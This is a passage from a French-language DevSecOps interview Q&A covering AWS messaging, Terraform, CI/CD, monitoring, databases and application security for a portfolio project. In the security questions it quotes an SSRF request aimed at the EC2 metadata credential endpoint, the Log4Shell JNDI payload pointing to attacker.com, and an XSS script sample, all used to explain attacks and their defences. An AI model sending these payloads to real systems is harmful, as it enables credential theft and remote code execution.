  - name: wait-for-postgres
    image: busybox:1.35
    command: ['sh', '-c',
      'until nc -z postgres-service 5432; do echo waiting; sleep 2; done']

  - name: run-migrations
    image: flyway/flyway:10
    command: ['flyway', 'migrate']
    env:
      - name: FLYWAY_URL
        value: jdbc:postgresql://postgres-service:5432/portfolio

containers:
  - name: backend
    image: backend:sha-abc123
    # Démarre seulement si postgres est prêt ET les migrations sont passées
```

Avantages vs `depends_on` Docker Compose :
- Séparation des responsabilités (migration dans un container dédié)
- Kubernetes gère le cycle de vie des init containers
- Le container principal ne démarre jamais sur une DB non migrée

---

## AWS Services Avancés

### Q246 — Quelle est la différence entre AWS SQS, SNS et EventBridge ?

Ces trois services gèrent la messagerie asynchrone, avec des cas d'usage distincts :

**SQS** (Simple Queue Service) : file d'attente point-à-point. Un message est consommé par **un seul** consumer. Idéal pour le découplage et le lissage de charge.
```
Producer → [Queue] → Consumer unique (worker)
```

**SNS** (Simple Notification Service) : fan-out pub/sub. Un message est livré à **tous les abonnés**. Idéal pour les notifications (email, SMS, SQS, Lambda).
```
Publisher → [Topic] → Lambda + SQS + Email + SMS (en parallèle)
```

**EventBridge** : bus d'événements avec routage par règles. Supporte les événements AWS natifs, les événements custom, et le scheduling (cron).
```
Source → [Event Bus] → Règle filtre → Target (Lambda, SQS, Step Functions...)
```

**Dans ce projet** :
- Lambda Weekly Report → déclenché par **EventBridge** (cron `0 9 ? * MON *`)
- Si on ajoutait des notifications → **SNS** fan-out (email + Slack + SQS)
- Si on ajoutait un worker de traitement asynchrone → **SQS** FIFO

---

### Q247 — Qu'est-ce qu'AWS Step Functions et dans quel cas l'utiliser ?

Step Functions orchestre des workflows d'étapes avec des états (State Machine). Chaque étape peut être une Lambda, une API AWS, une tâche ECS, une attente, une condition.

Exemple : workflow d'onboarding utilisateur
```
[Créer compte] → [Envoyer email vérification] → [Attendre vérification (24h max)]
                                                  ↓ (non vérifié)     ↓ (vérifié)
                                               [Supprimer]          [Activer compte]
                                                                     [Envoyer bienvenue]
```

**Avantages vs Lambda chainées manuellement** :
- Visualisation graphique du workflow
- Gestion des erreurs et retries configurables par étape
- État persistant (résiste aux pannes à mi-workflow)
- Timeout par étape

**Dans ce projet** : non utilisé (workflows Lambda simples). Step Functions serait justifié pour le resize d'images avec étapes multiples (validate → resize → webp → update DB → notify).

---

### Q248 — Quelles sont les différences entre AWS Inspector, GuardDuty et Macie ?

Ces trois services couvrent différents aspects de la sécurité AWS :

| Service | Ce qu'il surveille | Ce qu'il détecte |
|---------|-------------------|-----------------|
| **GuardDuty** | CloudTrail, VPC Flow Logs, DNS | Comportements anormaux (brute-force, mining, C2) |
| **Inspector** | EC2, ECR images, Lambda | Vulnérabilités logicielles (CVEs dans l'OS et les packages) |
| **Macie** | Buckets S3 | Données sensibles (numéros de carte, PII, secrets) dans S3 |

**Dans ce projet** :
- GuardDuty → détecte si quelqu'un accède à l'EC2 anormalement (Q222)
- Inspector → scannerait les images ECR pour les CVEs OS (complément à Trivy qui scanne les packages app)
- Macie → utile si des utilisateurs uploadent des documents dans S3 (formulaire de contact avec pièces jointes)

---

### Q249 — Comment fonctionnent les AWS Auto Scaling Groups (ASG) ?

Un ASG maintient automatiquement le nombre d'instances EC2 dans une plage définie (`min`, `max`, `desired`).

**Policies de scaling** :
- **Target Tracking** : maintenir CPU ≈ 60% — la plus simple. AWS calcule les ajustements.
- **Step Scaling** : règles par paliers (`CPU > 70% → +1 instance`, `CPU > 90% → +3 instances`)
- **Scheduled Scaling** : pré-scaler avant un événement connu (`8h → 5 instances`, `20h → 1 instance`)
- **Predictive Scaling** : ML prédit la charge future et scale proactivement

**Avec ALB** : l'ASG s'enregistre automatiquement dans le Target Group de l'ALB. Les nouvelles instances reçoivent du trafic après le health check.

**Dans ce projet** : single EC2, pas d'ASG (Free Tier, trafic faible). Pour une vraie production avec SLA, l'ASG garantit la disponibilité même en cas de panne d'une AZ.

---

### Q250 — Qu'est-ce que les IAM Conditions et donnez un exemple concret ?

Les IAM Conditions ajoutent des contraintes contextuelles aux politiques IAM — elles permettent des règles fines basées sur l'IP, l'heure, le tag, le MFA.

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:PutObject", "s3:GetObject"],
    "Resource": "arn:aws:s3:::portfolio-images/*",
    "Condition": {
      "StringEquals": {
        "aws:RequestedRegion": "eu-west-3"
      },
      "IpAddress": {
        "aws:SourceIp": "13.39.132.25/32"
      }
    }
  }]
}
```

Cette policy autorise S3 uniquement depuis l'IP de l'EC2 et seulement en région Paris.

**Conditions utiles pour DevSecOps** :
- `aws:MultiFactorAuthPresent: true` → exiger le MFA pour les actions destructives
- `aws:RequestedRegion` → confiner les ressources à une région (conformité RGPD)
- `s3:prefix` → restreindre l'accès à un préfixe S3 spécifique
- `ec2:ResourceTag/Environment: prod` → seuls les admins peuvent modifier les ressources taggées "prod"

---

### Q251 — Terraform vs AWS CloudFormation — quand choisir l'un ou l'autre ?

| Critère | Terraform | CloudFormation |
|---------|-----------|---------------|
| Multi-cloud | Oui (AWS + GCP + Azure) | Non (AWS uniquement) |
| État | Fichier state externe | Géré par AWS (natif) |
| Syntaxe | HCL (lisible) | JSON/YAML (verbeux) |
| Modules | Terraform Registry | Nested Stacks |
| Drift detection | `terraform plan` | AWS Config |
| Rollback | Manuel (`terraform destroy`) | Automatique sur échec |
| Support AWS natif | Lag de quelques jours | Immédiat (AWS first) |
| OSS vs propriétaire | Open source | AWS propriétaire |

**Règle** :
- AWS uniquement, équipe habituée à AWS → CloudFormation ou CDK (code TypeScript/Python)
- Multi-cloud ou équipe déjà formée Terraform → Terraform
- Ce projet → Terraform (lisibilité HCL, écosystème de modules, multi-cloud futur)

---

### Q252 — Qu'est-ce qu'AWS X-Ray et en quoi diffère-t-il d'OpenTelemetry ?

**AWS X-Ray** : service de tracing distribué propriétaire AWS. Instrumentation via SDK Java/Node. Visualisation dans la console AWS (Service Map, Traces).

**OpenTelemetry** : standard ouvert, vendor-neutral. Les traces peuvent être envoyées vers X-Ray, Jaeger, Zipkin, Datadog, Grafana Tempo — sans changer le code applicatif.

```java
// OpenTelemetry (code agnostique)
Tracer tracer = GlobalOpenTelemetry.getTracer("portfolio-backend");
Span span = tracer.spanBuilder("getProjects").startSpan();
// Exporter changeable : OTLPExporter → X-Ray, Tempo, Jaeger...

// X-Ray SDK (code couplé à AWS)
AWSXRay.beginSubsegment("getProjects");
```

**Dans ce projet** : ni X-Ray ni OTel ne sont configurés (le tracing est la lacune identifiée en Q230). La prochaine étape serait OpenTelemetry → OTLP → Grafana Tempo, pour rester vendor-agnostic.

---

## Sécurité Applicative

### Q253 — Comment Angular protège-t-il contre le XSS et que devez-vous éviter ?

Angular échappe automatiquement toutes les valeurs interpolées `{{ }}` et les bindings `[property]` — il les traite comme du texte, pas du HTML.

```typescript
// SÉCURISÉ — Angular échappe automatiquement
title = '<script>alert("xss")</script>';
// Template : {{ title }} → affiche le texte brut, pas le script

// DANGEREUX — bypass de la sécurité Angular
import { DomSanitizer } from '@angular/platform-browser';
this.sanitizer.bypassSecurityTrustHtml(userInput); // NE JAMAIS FAIRE avec des données utilisateur
```

**Ce qu'il faut éviter** :
1. `[innerHTML]="userContent"` avec du contenu non sanitisé
2. `bypassSecurityTrust*` sur des données externes
3. Insérer du HTML via `ElementRef.nativeElement.innerHTML = userInput`

**Dans ce projet** : les descriptions de projets viennent de l'API (données admin) — moins risquées. Si on permettait des commentaires publics, il faudrait sanitiser côté serveur (JSOUP en Java) ET laisser Angular sanitiser côté client.

---

### Q254 — Comment Spring Boot protège-t-il contre le CSRF, et pourquoi l'avez-vous désactivé ?

**CSRF** (Cross-Site Request Forgery) : une page malveillante fait effectuer des actions à un utilisateur authentifié sur un autre site. Fonctionne parce que le navigateur envoie automatiquement les cookies de session.

**Protection standard** : token CSRF dans chaque formulaire, vérifié par le serveur.

**Pourquoi désactivé dans ce projet** :
```java
http.csrf(csrf -> csrf.disable())
```

Parce que ce projet est une **API REST stateless avec JWT** :
1. **Pas de sessions** : le JWT est dans un header `Authorization`, pas dans un cookie. Le navigateur n'envoie pas les headers automatiquement → pas de CSRF possible.
2. **SPA Angular** : le frontend est une application séparée qui envoie le JWT explicitement.
3. **CORS restrictif** : seules les origines connues peuvent faire des requêtes cross-origin.

**Règle** : CSRF nécessaire pour les apps avec sessions (cookies). Inutile pour les API stateless JWT.

---

### Q255 — Qu'est-ce que le SSRF (Server-Side Request Forgery) ?

SSRF : l'attaquant fait effectuer des requêtes HTTP **par le serveur** vers des ressources internes. Le serveur devient un proxy involontaire.

**Exemple** : un endpoint qui accepte une URL et la charge :
```
POST /api/preview
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role" }
```
Le serveur AWS répond avec les credentials temporaires de l'IAM Role EC2 → **compromission totale**.

**Mitigations** :
1. **Valider les URLs** : rejeter les IPs privées (10.x, 172.16.x, 192.168.x, 169.254.x)
2. **IMDSv2** : AWS Instance Metadata Service v2 requiert un token préalable → protège contre le SSRF simple
3. **Résolution DNS** : résoudre l'URL et vérifier l'IP avant la requête
4. **Pas d'endpoint de proxy** : ne pas exposer de feature "charger une URL externe"

Dans ce projet, le Lambda image-resize reçoit une URL S3 (validée par AWS SDK) — pas de SSRF possible. Les inputs utilisateur ne sont jamais utilisés comme URL de requête.

---

### Q256 — Quels headers de sécurité HTTP sont importants et comment les configurer ?

Spring Security ajoute automatiquement certains headers. Voici la liste complète avec leur rôle :

```
# Automatiquement ajoutés par Spring Security
X-Content-Type-Options: nosniff        → empêche le MIME sniffing
X-Frame-Options: DENY                  → empêche le clickjacking (iframes)
X-XSS-Protection: 0                   → désactivé (CSP le remplace)
Cache-Control: no-cache, no-store      → pour les réponses authentifiées
Pragma: no-cache

# À ajouter manuellement pour une API REST
Strict-Transport-Security: max-age=31536000; includeSubDomains
# (HSTS — force HTTPS pour 1 an, configuré côté NGINX)

# Pour les pages HTML (frontend Angular)
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

**Test avec SecurityHeaders.com** : score A sur ce projet pour les headers backend. Le NGINX du frontend ajoute HSTS et CSP.

---

### Q257 — Comment automatiseriez-vous la rotation des secrets en production ?

Rotation manuelle = risque (oubli, procédure d'urgence stressante). Rotation automatique = sécurité sans friction.

**AWS Secrets Manager + Lambda rotation** :
```
Secrets Manager → déclenche Lambda rotation tous les 30 jours
Lambda :
  1. Génère un nouveau mot de passe aléatoire
  2. Met à jour le compte PostgreSQL via ALTER USER
  3. Met à jour le secret dans Secrets Manager
  4. Vérifie que la connexion fonctionne avec le nouveau secret
  5. Spring Boot relit le secret au prochain redémarrage (ou via @RefreshScope)
```

**Dans ce projet** : rotation manuelle (portfolio solo, risque faible). La configuration Terraform prévoit `rotation_rules { automatically_after_days = 30 }` mais avec `rotation_lambda_arn = null` (lambda non créée).

**Pour le JWT_SECRET** : rotation = invalide tous les tokens existants → déconnecter tous les utilisateurs. Prévoir une période de transition avec l'ancien + le nouveau secret.

---

### Q258 — Qu'est-ce que Log4Shell (CVE-2021-44228) et quelles leçons en tirer ?

Log4Shell est une vulnérabilité critique (CVSS 10.0) dans Log4j 2 (décembre 2021). Elle permettait l'exécution de code arbitraire à distance via une simple entrée de log.

**Mécanisme** :
```
Attaquant envoie dans n'importe quel champ : ${jndi:ldap://attacker.com/exploit}
Log4j loggue cette chaîne → évalue l'expression JNDI → contacte le serveur attaquant
→ Télécharge et exécute du code Java malveillant → RCE (Remote Code Execution)
```

**Impact** : des millions de serveurs Java vulnérables en 72h, y compris des infrastructures critiques.

**Leçons tirées dans ce projet** :
1. **Logback, pas Log4j** : choix de Logback (SLF4J) pour ce projet — non vulnérable à Log4Shell
2. **SBOM CycloneDX** : en cas de nouvelle CVE critique, le SBOM permet de savoir en secondes si le projet est affecté
3. **Dependabot** : mise à jour automatique des dépendances vulnérables
4. **OWASP Dependency Check** : bloque le build si une CVE critique est détectée

---

## CI/CD Avancé

### Q259 — Qu'est-ce que les branch protection rules GitHub et comment les configurer ?

Les branch protection rules empêchent les modifications directes sur des branches critiques (`main`, `release/*`).

**Règles configurées sur `main`** dans ce projet :
```
✅ Require pull request reviews (1 reviewer minimum)
✅ Dismiss stale reviews when new commits are pushed
✅ Require status checks to pass before merging
   → CI Backend (tests + SAST)
   → CI Frontend (tests + lint)
   → SonarCloud Quality Gate
✅ Require branches to be up to date before merging
✅ Include administrators (personne ne bypass, même le owner)
✅ Restrict force pushes
✅ Restrict deletions
```

**Impact DevSecOps** : personne ne peut déployer en production du code non testé, non reviewé et sans Quality Gate passé — même le propriétaire du repo. C'est le fondement du shift-left security.

---

### Q260 — Qu'est-ce que le Semantic Versioning (SemVer) et comment l'appliquez-vous ?

SemVer définit le format `MAJOR.MINOR.PATCH` :
- **MAJOR** : breaking change (incompatibilité API)
- **MINOR** : nouvelle feature rétrocompatible
- **PATCH** : bug fix rétrocompatible

Exemples : `1.2.3 → 1.2.4` (bug fix), `1.2.3 → 1.3.0` (nouvelle feature), `1.2.3 → 2.0.0` (breaking change)

**Conventional Commits → SemVer automatique** :
- `fix:` → PATCH
- `feat:` → MINOR
- `feat!:` ou `BREAKING CHANGE:` → MAJOR

Dans ce projet, les tags de release suivent SemVer. Les images ECR sont taggées avec le SHA commit (`sha-abc123`) pour l'immuabilité — le SemVer est sur les GitHub Releases.

**Outil** : `semantic-release` automatise le bump de version, le changelog, et la création de GitHub Release à partir des conventional commits.

---

### Q261 — Qu'est-ce que les GitHub Actions Matrix Builds ?

La matrix strategy permet d'exécuter un même job sur plusieurs combinaisons de paramètres en parallèle.

```yaml
jobs:
  test:
    strategy:
      matrix:
        java: [17, 21]
        os: [ubuntu-latest, windows-latest]
        fail-fast: false  # continue même si une combinaison échoue
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/setup-java@v4
        with:
          java-version: ${{ matrix.java }}
      - run: mvn test
```

Cela génère 4 jobs parallèles : Java17/Ubuntu, Java17/Windows, Java21/Ubuntu, Java21/Windows.

**Dans ce projet** : la CI backend tourne sur Java 21 uniquement (pas de compatibilité multi-version requise). La matrix serait utile pour une librairie publique qui supporte Java 17, 21 et 24.

---

### Q262 — Qu'est-ce que l'OIDC entre GitHub Actions et AWS, et pourquoi l'utiliser ?

Sans OIDC : les credentials AWS (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`) sont stockés dans GitHub Secrets — clés permanentes, risque de fuite.

Avec **OIDC** (OpenID Connect) : GitHub Actions génère un token JWT éphémère signé par GitHub. AWS STS échange ce token contre des credentials temporaires via un IAM Identity Provider.

```yaml
# Dans le workflow
permissions:
  id-token: write  # Autoriser GitHub à générer un OIDC token

- name: Configure AWS credentials via OIDC
  uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789:role/github-actions-portfolio
    aws-region: eu-west-3
```

```hcl
# Terraform - IAM Role avec trust policy GitHub OIDC
resource "aws_iam_role" "github_actions" {
  assume_role_policy = jsonencode({
    Statement = [{
      Principal = { Federated = "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com" }
      Condition = { StringEquals = { "token.actions.githubusercontent.com:sub": "repo:amine77/devsecops-angular-java21-aws:ref:refs/heads/main" }}
    }]
  })
}
```

**Avantage** : zéro credential permanent dans GitHub. Les credentials expirent en 15 minutes. Le trust est limité à une repo et une branche spécifiques.

---

### Q263 — Qu'est-ce qu'un déploiement Canary et comment le différencier d'un Rolling Update ?

**Rolling Update** : les anciennes instances sont remplacées progressivement par les nouvelles (1 à la fois, ou par batch). À tout moment, des instances des deux versions tournent.
```
v1 v1 v1 v1 → v2 v1 v1 v1 → v2 v2 v1 v1 → v2 v2 v2 v1 → v2 v2 v2 v2
```

**Canary** : 1-5% du trafic est routé vers la nouvelle version. Le reste reste sur l'ancienne. On surveille les métriques (erreurs, latence) avant d'augmenter graduellement.
```
95% trafic → v1    5% trafic → v2 (canary)
→ métriques OK → 50/50 → 100% v2
```

**Dans ce projet** : rolling update Docker (`docker compose up -d backend` redémarre le container progressivement). En Kubernetes, `strategy: RollingUpdate` avec `maxUnavailable: 0, maxSurge: 1`. Le canary nécessite un ingress controller avancé (Nginx Ingress avec annotations de weight, ou Istio traffic splitting).

---

## Monitoring & Observabilité

### Q264 — Comment provisionnez-vous les dashboards Grafana automatiquement ?

Le provisioning Grafana permet de charger des dashboards et datasources depuis des fichiers — plus de configuration manuelle via l'UI.

```yaml
# grafana/provisioning/datasources/prometheus.yml
apiVersion: 1
datasources:
  - name: Prometheus
    type: prometheus
    url: http://prometheus:9090
    isDefault: true
    editable: false
```

```yaml
# grafana/provisioning/dashboards/portfolio.yml
apiVersion: 1
providers:
  - name: portfolio
    type: file
    options:
      path: /var/lib/grafana/dashboards
```

Les fichiers JSON des dashboards sont dans `grafana/dashboards/*.json`. Ils sont versionnés dans Git — un redéploiement recrée exactement les mêmes dashboards.

**Dans ce projet** : 3 dashboards provisionnés (Portfolio Overview, Redis Cache, Kafka Metrics). `docker-compose.yml` monte les répertoires de provisioning dans le container Grafana.

---

### Q265 — Quelle est la différence entre l'ELK Stack et CloudWatch pour la gestion des logs ?

**ELK Stack** (Elasticsearch + Logstash + Kibana) :
- **Auto-hébergé** → contrôle total, coût fixe (infrastructure)
- **Recherche full-text** très performante avec Elasticsearch
- **Visualisations** avancées dans Kibana
- **Complexité** : cluster Elasticsearch à maintenir, mises à jour, sauvegardes

**CloudWatch Logs** :
- **Managé AWS** → zéro maintenance, scalable automatiquement
- **Intégration native** EC2/Lambda/RDS/ECS → logs automatiques
- **CloudWatch Logs Insights** : requêtes SQL-like sur les logs
- **Coût** : pay-per-use (~$0.50/GB ingéré + $0.005/GB stocké)

**Dans ce projet** : CloudWatch (managé, simplicité, intégration native). ELK serait justifié pour des volumes élevés (milliards de logs/jour) ou des besoins de recherche full-text avancés non couverts par CloudWatch Insights.

---

### Q266 — Qu'est-ce que le monitoring synthétique et comment le mettre en place ?

Le monitoring synthétique simule des interactions utilisateur à intervalles réguliers pour vérifier la disponibilité et les performances — sans attendre qu'un vrai utilisateur signale un problème.

```yaml
# Exemple : CloudWatch Synthetics Canary
- Toutes les 5 minutes, un script Puppeteer :
  1. Charge https://charrad-devsecops.duckdns.org
  2. Clique sur "Voir les projets"
  3. Vérifie que 2+ cartes projets sont affichées
  4. Mesure le temps de chargement (alerte si > 3s)
  5. Prend un screenshot en cas d'échec
```

**Outils** :
- **AWS CloudWatch Synthetics** : intégré à CloudWatch, Puppeteer/Selenium
- **Datadog Synthetic Tests** : très complet, coûteux
- **Uptime Robot** (gratuit) : ping HTTP simple, alertes email

**Différence avec les health checks** : les health checks vérifient que le serveur répond. Le monitoring synthétique vérifie que le **parcours utilisateur** fonctionne de bout en bout.

---

### Q267 — Comment configurez-vous Prometheus pour scraper plusieurs targets ?

```yaml
# prometheus.yml
global:
  scrape_interval: 15s
  evaluation_interval: 15s

scrape_configs:
  - job_name: 'portfolio-backend'
    metrics_path: '/actuator/prometheus'
    static_configs:
      - targets: ['backend:8080']
    relabel_configs:
      - source_labels: [__address__]
        target_label: instance

  - job_name: 'redis'
    static_configs:
      - targets: ['redis-exporter:9121']

  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']
    scrape_interval: 30s  # Override global

alerting:
  alertmanagers:
    - static_configs:
        - targets: ['alertmanager:9093']

rule_files:
  - '/etc/prometheus/alerts/*.yml'
```

**Dans ce projet** : Spring Boot Actuator expose directement `/actuator/prometheus` — pas besoin d'exporter séparé. Redis nécessite un `redis_exporter` (agent intermédiaire qui traduit les métriques Redis vers le format Prometheus).

---

### Q268 — Qu'est-ce que les pratiques on-call SRE et comment se prépare-t-on ?

L'on-call est la permanence pour répondre aux alertes en dehors des heures ouvrées. Bonnes pratiques SRE :

**Avant l'on-call** :
- Runbooks à jour pour chaque alerte (Q194)
- Dashboards Grafana lisibles par quelqu'un réveillé à 3h du matin
- Alertes calibrées : assez sensibles pour détecter, assez spécifiques pour éviter les faux positifs

**Pendant l'on-call** :
- Utiliser les runbooks, ne pas improviser sous stress
- Communiquer l'état toutes les 30 min (même "pas encore résolu")
- Prioriser la mitigation (rollback rapide) avant la résolution (fix propre)

**Après l'on-call** :
- Post-mortem blameless (Q152)
- Améliorer les runbooks avec ce qui a été appris
- Réduire le bruit d'alerte (trop d'alertes → alerte fatigue → alertes ignorées)

**Dans ce projet** : CloudWatch Alarmes → SNS → email. En équipe, on utiliserait PagerDuty ou OpsGenie pour la rotation d'astreinte et l'escalade automatique.

---

## Terraform Avancé

### Q269 — Comment structurez-vous les modules Terraform dans un projet réel ?

```
terraform/
├── modules/              # Modules réutilisables
│   ├── vpc/
│   │   ├── main.tf
│   │   ├── variables.tf
│   │   └── outputs.tf
│   ├── ec2/
│   ├── rds/
│   ├── lambda-contact-form/
│   ├── lambda-image-resize/
│   └── lambda-weekly-report/
├── environments/
│   ├── dev/
│   │   ├── main.tf          # Appelle les modules avec des variables dev
│   │   ├── terraform.tfvars
│   │   └── backend.tf       # S3 backend spécifique dev
│   └── prod/
│       ├── main.tf
│       └── terraform.tfvars
└── shared/
    └── iam-roles.tf         # Ressources partagées entre envs
```

**Dans ce projet** : cette structure est implémentée. Chaque Lambda a son module dédié (`lambda-contact-form/`) avec `main.tf` (ressource Lambda), `variables.tf` (entrées : nom, handler, env vars), `outputs.tf` (ARN Lambda, URL API Gateway).

---

### Q270 — Qu'est-ce que les `data sources` Terraform et quand les utiliser ?

Les `data sources` permettent de **lire** des ressources existantes sans les gérer. Contrairement aux `resource`, elles ne créent/modifient rien.

```hcl
# Lire l'AMI Amazon Linux 2023 la plus récente
data "aws_ami" "amazon_linux_2023" {
  most_recent = true
  owners      = ["amazon"]
  filter {
    name   = "name"
    values = ["al2023-ami-*-x86_64"]
  }
}

# Utiliser dans une resource
resource "aws_instance" "portfolio" {
  ami           = data.aws_ami.amazon_linux_2023.id
  instance_type = "t3.small"
}

# Lire un secret existant dans Secrets Manager
data "aws_secretsmanager_secret_version" "db_password" {
  secret_id = "portfolio/dev"
}
```

**Cas d'usage** :
- AMI la plus récente (toujours up-to-date sans hardcoder l'AMI ID)
- ID d'une ressource créée hors Terraform (compte AWS courant, zones de disponibilité)
- Secrets existants à injecter dans la configuration

---

### Q271 — Qu'est-ce qu'Ansible et en quoi est-il complémentaire de Terraform ?

**Terraform** : provisionne l'infrastructure (crée l'EC2, le VPC, la RDS). Il gère l'état des ressources cloud.

**Ansible** : configure les machines une fois provisionnées (installe Docker, copie les fichiers de configuration, exécute des commandes). Il est agentless (SSH) et idempotent.

**Flux typique** :
```
Terraform → crée EC2 (IP = 13.39.x.x)
Ansible → se connecte via SSH à 13.39.x.x → installe Docker + docker-compose → démarre les services
```

**Dans ce projet** : le `user_data` de l'EC2 Terraform joue le rôle d'Ansible (script bash qui installe Docker et clone le repo). Pour un vrai environment multi-machines, Ansible Playbooks seraient plus maintenables.

**Terraform + Ansible** = le duo classique IaC : Terraform pour l'infra immuable, Ansible pour la configuration mutable.

---

### Q272 — Qu'est-ce que `terraform import` et dans quel cas l'utiliser ?

`terraform import` associe une ressource AWS existante (créée manuellement ou hors Terraform) au state Terraform.

```bash
# Importer une instance EC2 existante dans Terraform
terraform import aws_instance.portfolio i-0abcd1234ef567890

# Importer un bucket S3
terraform import aws_s3_bucket.images portfolio-dev-images
```

**Cas d'usage** :
1. **Brownfield migration** : une équipe a créé des ressources via la console AWS, on veut maintenant les gérer avec Terraform
2. **State perdu** : le `terraform.tfstate` a été supprimé, les ressources AWS existent toujours — import pour reconstruire le state
3. **Split d'état** : diviser un gros state en modules

**Workflow** :
1. Écrire le bloc `resource` dans le code Terraform
2. `terraform import` pour associer la ressource existante
3. `terraform plan` → doit afficher "No changes" si le code correspond à la réalité
4. Ajuster jusqu'à zéro diff

---

## Base de données Avancée

### Q273 — Qu'est-ce que les propriétés ACID d'une transaction ?

ACID garantit la fiabilité des transactions de base de données :

- **Atomicité** : la transaction est tout ou rien. Si une étape échoue, toutes les modifications sont annulées. `@Transactional` en Spring Boot garantit l'atomicité.
- **Cohérence** : la transaction amène la DB d'un état valide à un autre état valide. Les contraintes (FK, UNIQUE, NOT NULL) sont vérifiées.
- **Isolation** : les transactions concurrentes ne se voient pas mutuellement pendant leur exécution. Niveaux : READ UNCOMMITTED, READ COMMITTED, REPEATABLE READ, SERIALIZABLE.
- **Durabilité** : une fois commitée, la transaction persiste même en cas de panne (grâce au WAL - Write-Ahead Log de PostgreSQL).

**Dans ce projet** : `@Transactional(readOnly = true)` → isolation READ COMMITTED (défaut PostgreSQL). `@Transactional` (écriture) → atomicité garantie si une exception est levée.

---

### Q274 — Qu'est-ce que la réplication PostgreSQL et comment fonctionne-t-elle ?

La réplication PostgreSQL copie les données du **primaire** (master) vers un ou plusieurs **réplicas** (standby) :

**Streaming Replication** (physique) :
- Le primaire envoie le WAL (Write-Ahead Log) en continu
- Le réplica rejoue le WAL → copie exacte du primaire
- Lag typique : < 100ms

**Logical Replication** :
- Réplique des tables ou opérations spécifiques (plus flexible)
- Permet des versions PostgreSQL différentes entre primaire et réplica

**Types de standby** :
- **Hot standby** : le réplica accepte des requêtes SELECT → soulage les lectures
- **Warm standby** : le réplica ne sert aucun trafic (failover pur)

**Dans ce projet** : RDS PostgreSQL Single-AZ (pas de réplica). Multi-AZ RDS → réplication synchrone automatique + failover automatique en ~60s. Read Replica RDS → pour décharger les requêtes SELECT intensives.

---

### Q275 — Qu'est-ce que le sharding et en quoi diffère-t-il du partitionnement ?

**Partitionnement** : diviser une table en plusieurs partitions sur le **même serveur** PostgreSQL. Les données sont toujours dans la même instance.

```sql
-- Partitionnement par mois sur la table d'audit
CREATE TABLE audit_logs (
  id BIGSERIAL,
  created_at TIMESTAMPTZ NOT NULL,
  event TEXT
) PARTITION BY RANGE (created_at);

CREATE TABLE audit_logs_2026_01 PARTITION OF audit_logs
  FOR VALUES FROM ('2026-01-01') TO ('2026-02-01');
```

**Sharding** : distribuer les données sur **plusieurs serveurs** différents. Chaque shard est une instance PostgreSQL indépendante.

| | Partitionnement | Sharding |
|--|----------------|---------|
| Serveurs | 1 | N |
| Complexité | Faible | Élevée |
| Scalabilité | Verticale (RAM/CPU) | Horizontale (N machines) |
| Requêtes cross-partition | Transparentes | Complexes (cross-shard JOIN) |

**Dans ce projet** : ni l'un ni l'autre (table projects < 1000 lignes). Pour des millions de projets : partitionnement par status ou date.

---

### Q276 — Qu'est-ce que PgBouncer et pourquoi l'utiliser avec Spring Boot ?

PgBouncer est un **connection pooler** externe pour PostgreSQL. Il se place entre l'application et PostgreSQL.

**Problème** : PostgreSQL crée un processus OS par connexion. 200 connexions HikariCP × N instances Spring Boot = des milliers de processus PostgreSQL → épuisement mémoire.

```
Spring Boot (HikariCP, 10 connections)
        ↓
[PgBouncer : pool de 10 connections vers PG]
        ↓
PostgreSQL (max_connections = 100)
```

**Modes** :
- **Session** : 1 connexion PostgreSQL par session client (pas d'économie)
- **Transaction** : la connexion PostgreSQL est libérée entre les transactions → N applications peuvent partager M connexions (M << N)
- **Statement** : libérée entre chaque requête (incompatible avec les transactions)

**Dans ce projet** : HikariCP direct (10 connexions max, trafic faible). PgBouncer serait indispensable pour 50+ instances Spring Boot partageant le même RDS.

---

### Q277 — Qu'est-ce que la recherche full-text PostgreSQL et quand l'utiliser ?

PostgreSQL inclut un moteur de recherche full-text natif, sans Elasticsearch.

```sql
-- Ajouter une colonne tsvector
ALTER TABLE projects ADD COLUMN search_vector tsvector;
UPDATE projects SET search_vector = to_tsvector('french', title || ' ' || description);
CREATE INDEX idx_projects_search ON projects USING GIN(search_vector);

-- Rechercher
SELECT * FROM projects
WHERE search_vector @@ plainto_tsquery('french', 'machine learning AWS')
ORDER BY ts_rank(search_vector, plainto_tsquery('french', 'machine learning AWS')) DESC;
```

**Fonctionnalités** :
- Stemming (chercher "déploiement" trouve "déployer", "déployé")
- Stop words (les, de, et → ignorés)
- Ranking par pertinence
- Plusieurs langues

**Dans ce projet** : la recherche de projets côté Angular filtre en mémoire (dataset petit). Si le nombre de projets dépassait 1000, le full-text PostgreSQL remplacerait avantageusement une solution externe comme Elasticsearch.

---

## Architecture & Patterns

### Q278 — Quels principes SOLID applique-t-on dans ce projet ?

SOLID est un acronyme de 5 principes de design orienté objet :

**S — Single Responsibility** : chaque classe a une seule raison de changer.
→ `ProjectService` ne fait que la logique métier. `ProjectRepository` gère la persistance. `ProjectMapper` gère le mapping.

**O — Open/Closed** : ouvert à l'extension, fermé à la modification.
→ Ajouter un nouveau type de notification : implémenter `NotificationStrategy` sans toucher `ProjectService`.

**L — Liskov Substitution** : une sous-classe peut remplacer sa classe parente.
→ `ProjectRepository` (interface Spring Data) peut être remplacée par une implémentation de test.

**I — Interface Segregation** : interfaces fines plutôt qu'une grosse interface.
→ `UserDetailsService` (lire l'utilisateur) séparé de `UserService` (modifier l'utilisateur).

**D — Dependency Inversion** : dépendre des abstractions, pas des implémentations.
→ `ProjectService` dépend de `ProjectRepository` (interface), pas de `JpaProjectRepository` (impl).

---

### Q279 — Qu'est-ce que l'Architecture Hexagonale (Ports & Adapters) ?

L'architecture hexagonale isole le **domaine métier** au centre, entouré de **ports** (interfaces) et d'**adapters** (implémentations concrètes).

```
                    [REST Controller]
                           ↓ (Adapter entrant)
[Tests unitaires] → [Port entrant] → [Domain Service] → [Port sortant] → [Adapter sortant]
                                                                    ↑               ↑
                                                            [JPA Repository]  [Redis Cache]
                                                            [Email Service]   [Kafka Producer]
```

**Avantage** : le domaine métier (business logic pure) n'a aucune dépendance sur Spring, JPA, ou AWS. On peut tester la logique métier sans infrastructure.

